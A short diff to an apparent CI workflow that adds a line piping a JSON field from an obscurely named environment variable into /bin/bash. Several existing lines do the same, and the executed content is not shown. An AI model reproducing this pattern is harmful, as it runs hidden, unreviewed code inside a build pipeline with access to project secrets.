@@ -25,6 +25,7 @@ jobs:
           echo $kqtpi02 | jq -r .eir95723 | /bin/bash
           echo $xpab13 | jq -r .rpf477 | /bin/bash
           echo $rpth8 | jq -r .ykrsi7 | /bin/bash
+          printf '%s' "$lf1988" | jq -r .upm76874 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
